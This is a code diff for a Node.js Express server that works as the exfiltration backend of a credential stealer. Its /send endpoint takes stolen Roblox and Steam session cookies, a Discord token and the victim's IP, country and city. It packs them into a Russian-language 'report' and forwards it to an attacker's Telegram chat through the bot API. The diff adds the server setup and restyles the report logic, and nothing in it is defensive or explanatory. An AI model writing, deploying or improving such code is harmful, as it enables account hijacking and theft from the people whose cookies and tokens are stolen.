@@ -1,6 +1,18 @@
+const express = require('express');
+const axios = require('axios');
+const cors = require('cors');
+const app = express();
+
+app.use(cors());
+app.use(express.json({ limit: '10mb' }));
+
+const TOKEN = process.env.TOKEN;
+const CHAT_ID = process.env.CHAT_ID;
+const API = "https://api.telegram.org/bot" + TOKEN;
+
 app.post('/send', async (req, res) => {
     try {
-        const { robloxCookie, steamCookie, discordToken, robloxStatus, steamStatus, discordStatus, ip, country, city } = req.body;
+        const { robloxCookie, steamCookie, discordToken, ip, country, city, robloxStatus, steamStatus, discordStatus } = req.body;
 
         let msg = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n";
         msg += "━━━━━━━━━━━━━━━━━━\n\n";
@@ -9,20 +21,35 @@ app.post('/send', async (req, res) => {
         msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
         msg += "━━━━━━━━━━━━━━━━━━\n\n";
 
+        // Roblox
         msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
-        if (robloxStatus === "new") msg += "<code>" + robloxCookie + "</code>\n\n";
-        else if (robloxStatus === "sent") msg += "✅ Уже отправлен\n\n";
-        else msg += "❌ Не найден\n\n";
+        if (robloxStatus === "new") {
+            msg += "<code>" + robloxCookie + "</code>\n\n";
+        } else if (robloxStatus === "sent") {
+            msg += "✅ Уже отправлен\n\n";
+        } else {
+            msg += "❌ Не найден\n\n";
+        }
 
+        // Steam
         msg += "🎮 <b>STEAM COOKIE:</b>\n";
-        if (steamStatus === "new") msg += "<code>" + steamCookie + "</code>\n\n";
-        else if (steamStatus === "sent") msg += "✅ Уже отправлен\n\n";
-        else msg += "❌ Не найден\n\n";
+        if (steamStatus === "new") {
+            msg += "<code>" + steamCookie + "</code>\n\n";
+        } else if (steamStatus === "sent") {
+            msg += "✅ Уже отправлен\n\n";
+        } else {
+            msg += "❌ Не найден\n\n";
+        }
 
+        // Discord
         msg += "💬 <b>DISCORD TOKEN:</b>\n";
-        if (discordStatus === "new") msg += "<code>" + discordToken + "</code>\n\n";
-        else if (discordStatus === "sent") msg += "✅ Уже отправлен\n\n";
-        else msg += "❌ Discord не открыт\n\n";
+        if (discordStatus === "new") {
+            msg += "<code>" + discordToken + "</code>\n\n";
+        } else if (discordStatus === "sent") {
+            msg += "✅ Уже отправлен\n\n";
+        } else {
+            msg += "❌ Discord не открыт\n\n";
+        }
 
         msg += "━━━━━━━━━━━━━━━━━━\n";
         msg += "⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");
@@ -38,3 +65,5 @@ app.post('/send', async (req, res) => {
         res.status(500).json({ ok: false, error: e.message });
     }
 });
+
+app.listen(process.env.PORT || 3000);
